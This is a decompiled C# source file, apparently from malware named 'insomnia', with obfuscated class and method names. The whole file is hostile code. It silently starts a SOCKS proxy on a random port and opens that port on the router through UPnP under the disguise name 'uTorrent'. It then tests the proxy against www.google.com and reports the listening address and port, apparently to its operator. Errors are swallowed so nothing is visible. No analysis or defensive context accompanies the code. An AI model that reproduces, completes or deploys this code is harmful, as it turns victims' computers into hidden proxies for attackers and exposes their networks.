using System;
using System.Net.Sockets;
using System.Threading;

namespace insomnia;

internal class Class25
{
	private static Random Field4 = new Random();

	public static int Field3 = Convert.ToInt32(Field4.Next(2000, 20000));

	public static string Field2 = "";

	public static string Field1 = "no";

	public static void Method3()
	{
		new Thread(Method2).Start();
		Thread.Sleep(5000);
		TcpListener tcpListener = new TcpListener(Field3);
		new Thread(Method1).Start();
		tcpListener.Start();
		while (true)
		{
			TcpClient client = tcpListener.AcceptTcpClient();
			Class21 @object = new Class21(client);
			Thread thread = new Thread(@object.Method1);
			thread.Start();
		}
	}

	public static void Method2()
	{
		try
		{
			Class29.Method5();
			Class29.Method1(Field3, Field3, "TCP", "uTorrent");
			Field1 = "yes";
		}
		catch
		{
		}
	}

	public static void Method1()
	{
		Thread.Sleep(10000);
		try
		{
			Class38.Method1(Class39.Field2, Field3, "www.google.com", 80, Class26.Field2, Class26.Field1);
			Field2 = "[SOCKS]: Listening on -> [" + Class39.Field2 + ":" + Field3 + "] [" + Class26.Field2 + ":" + Class26.Field1 + "] [UPNP:" + Field1 + "]";
			Class31.Method3(Field2, Class26.Field8);
		}
		catch
		{
		}
	}
}
